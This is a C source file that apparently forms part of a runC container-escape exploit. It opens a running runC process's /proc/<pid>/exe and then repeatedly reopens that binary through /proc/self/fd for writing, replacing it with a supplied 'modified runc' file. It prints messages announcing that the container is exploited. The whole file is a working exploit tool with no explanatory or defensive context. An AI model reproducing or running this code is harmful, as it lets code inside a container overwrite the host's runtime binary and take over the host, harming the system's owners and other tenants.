#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define FALSE 0
#define TRUE  1

typedef struct Buffer
{
	int len;		// buffer length
	void * buff;		// buffer data
} Buffer;

const char * MODIFIED_RUNC_PATH = "/modified_runc";
const unsigned int PATH_MAX_LEN = 30;
const int OPEN_ERR = -1;
const int RET_ERR = 1;
const int RET_OK = 0;
const long WRITE_TIMEOUT = 99999999999999999;

Buffer read_modified_runc(char * modified_runc_path);

/*
* overwrite </proc/runc_pid/exe> <modified runc path>
* Overwrites the runC binary.
*/
int main(int argc, char *argv[])
{
	int runc_fd_read, my_runc_fd, wc;
	char my_runc_fd_path[PATH_MAX_LEN];
	char * modified_runc_path;           
	char * runc_exe_path;

	Buffer modified_runc;

	if (argc == 1 || argc > 3)
	{
		printf("Usage: %s </proc/runc_pid/exe> <modified runc path>\n", argv[0]);
		return RET_ERR;
	}

	/* Read at /proc/runc_pid/exe */
	runc_exe_path = argv[1];
	runc_fd_read = open(runc_exe_path, O_RDONLY);
	if (runc_fd_read == OPEN_ERR)
	{
		printf("[!] Couldn't open runC's exe %s\n", runc_exe_path);
		return RET_ERR;
	}
	printf("[+] Got %s as fd %d in this process\n", runc_exe_path, runc_fd_read);


	/* Read modified_runc */
	if (argc < 3)
		modified_runc_path = MODIFIED_RUNC_PATH;
	else
		modified_runc_path = argv[2];
	modified_runc = read_modified_runc(modified_runc_path);
	if (modified_runc.buff == NULL)
	{
		close(runc_fd_read);
		return RET_ERR;
	}
	printf("[+] Read %d bytes from modified runC\n", modified_runc.len);

	/* Open /proc/self/fd/runc_fd_read for writing */
	sprintf(my_runc_fd_path, "/proc/self/fd/%d", runc_fd_read);
	int opened = FALSE;
	for (long count = 0; (!opened && count < WRITE_TIMEOUT); count++)
	{
		my_runc_fd = open(my_runc_fd_path, O_WRONLY | O_TRUNC);
		if (my_runc_fd != OPEN_ERR)
		{
			wc = write(my_runc_fd, modified_runc.buff, modified_runc.len);
			if (wc !=  modified_runc.len)
			{
				printf("[!] Couldn't write to process's runC files");
				close(my_runc_fd);
				close(runc_fd_read);
				free(modified_runc.buff);
				return RET_ERR;
			}
			printf("[+] Opened runC for writing (via %s)\n", my_runc_fd_path);
			printf("[+] Succesfully overwritten runC binaries\n");
			printf("[+] Succesfully exploited the container\n");
			opened = TRUE;
		}
	}

	close(my_runc_fd);
	close(runc_fd_read);
	free(modified_runc.buff);
	if (opened == FALSE)
	{
		printf("[!] TIMEOUT...\n");
		return RET_ERR;
	}
	else
		printf("[+] Runc is overwritten and container is exploited, shuting down ...\n");

	fflush(stdout);
	return RET_OK;

}


/*
* Reads from the modified runc file and return a buffer with the modified content.
*/
Buffer read_modified_runc(char * modified_runc_path)
{
	Buffer modified_runc = {0, NULL};
	FILE *fp_modified_runc;
	int file_size, rc;
	void * modified_runc_content;
	char ch;

	fp_modified_runc = fopen(modified_runc_path, "r"); // read mode
	if (fp_modified_runc == NULL)
	{
	  printf("[!] open file err while opening the modified runc file %s\n", modified_runc_path);
	  return modified_runc;
	}

	// Get file size and prepare buff
	fseek(fp_modified_runc, 0L, SEEK_END);
	file_size = ftell(fp_modified_runc);
	modified_runc_content = malloc(file_size);
	rewind(fp_modified_runc);

	rc = fread(modified_runc_content, 1, file_size, fp_modified_runc);
	if (rc != file_size)
	{
		printf("[!] Couldn't read from the modified runc file at %s\n", modified_runc_path);
		free(modified_runc_content);
		return modified_runc;
	}

	fclose(fp_modified_runc);
	modified_runc.len = rc;
	modified_runc.buff = modified_runc_content;
	return modified_runc;

}
